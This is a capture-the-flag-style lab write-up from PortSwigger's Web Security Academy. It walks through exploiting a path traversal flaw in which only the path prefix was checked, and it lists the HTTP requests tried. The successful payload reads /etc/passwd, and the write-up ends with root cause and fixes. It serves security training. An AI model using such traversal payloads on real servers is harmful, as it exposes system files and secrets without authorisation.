# File Path Traversal via Weak Start-of-Path Validation

## Platform
PortSwigger Web Security Academy

## Category
Path Traversal Vulnerability

## Lab Goal
Retrieve the contents of the `/etc/passwd` file.

---

# Vulnerability Description

The application was vulnerable to a file path traversal attack in the product image functionality.

The server validated only whether the supplied file path started with the expected image directory:

```text
/var/www/images/
```

However, it failed to properly sanitize directory traversal sequences such as:

```text
../
```

As a result, attackers could traverse outside the intended directory and access arbitrary files on the server.

---

# Initial Analysis

The product image endpoint used the following request format:

```http
GET /image?filename=/var/www/images/30.jpg
```

The server successfully returned the requested image.

---

# Testing Path Traversal Payloads

Several traversal payloads were tested using Burp Suite Repeater.

## Attempt 1

```http
GET /image?filename=/var/www/images/etc/passwd
```

Response:

```text
400 Bad Request
```

---

## Attempt 2

```http
GET /image?filename=/var/www/images/../etc/passwd
```

Response:

```text
400 Bad Request
```

---

## Attempt 3

```http
GET /image?filename=/var/www/images/../../etc/passwd
```

Response:

```text
400 Bad Request
```

---

## Successful Payload

```http
GET /image?filename=/var/www/images/../../../etc/passwd
```

Response:

```text
200 OK
```

The server returned the contents of the `/etc/passwd` file successfully.

---

# Result

Successfully retrieved sensitive system file contents from:

```text
/etc/passwd
```

---

# Impact

An attacker could exploit this vulnerability to:

- Access sensitive server files
- Retrieve configuration files
- Leak application secrets or credentials
- Gather information about the underlying operating system
- Potentially escalate attacks further

Path traversal vulnerabilities can expose critical internal server data.

---

# Root Cause

The application performed insufficient validation on user-supplied file paths.

Although it checked whether the path started with the expected directory, it failed to normalize and sanitize traversal sequences like:

```text
../
```

This allowed attackers to escape the intended directory structure.

---

# Recommended Fixes

## 1. Normalize File Paths
Resolve and normalize file paths before processing requests.

## 2. Block Traversal Sequences
Reject path traversal patterns such as:

```text
../
```

and encoded traversal variants.

## 3. Use Allowlisted Filenames
Serve only predefined files instead of accepting arbitrary paths from users.

## 4. Restrict File Access
Use filesystem permissions and sandboxing to limit accessible directories.

---

# Tools Used

- Burp Suite (Repeater)
- Browser
- Ubuntu Linux

---

# Key Takeaways

- Weak path validation can still be bypassed using traversal sequences.
- Checking only the beginning of a file path is not sufficient protection.
- Sensitive system files such as `/etc/passwd` should never be accessible through user-controlled requests.
- Path traversal remains a common and dangerous web application vulnerability.
